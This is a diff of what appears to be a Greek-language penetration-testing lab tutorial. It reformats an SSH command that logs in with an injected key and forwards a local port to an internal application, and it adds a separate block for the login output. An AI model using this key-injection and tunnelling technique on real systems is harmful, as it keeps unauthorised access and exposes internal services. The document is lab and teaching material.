@@ -1013,7 +1274,12 @@ pentest@ubuntu-lab:~$ 
 Η ίδια δυνατότητα συνδυάζεται με το tunnelling της ενότητας 11 — εκεί όπου μια έκθεση αξιολόγησης συνήθως αποτυπώνει την εικόνα από κοινού: μία εντολή που πιστοποιείται με το εγχυμένο κλειδί *και* ανοίγει προώθηση στην εσωτερική εφαρμογή σε νέα τοπική πόρτα.
 
 ```bash
-root@kali:~# ssh -i /root/.ssh/id_ed25519 -L 7777:127.0.0.1:8080 pentest@192.168.1.9
+ssh -i /root/.ssh/id_ed25519 -L 7777:127.0.0.1:8080 pentest@192.168.1.9
+```
+
+**Έξοδος:**
+
+```text
 Last login: Thu Jan 11 10:55:03 2024 from 192.168.1.9
 pentest@ubuntu-lab:~$ 
 ```
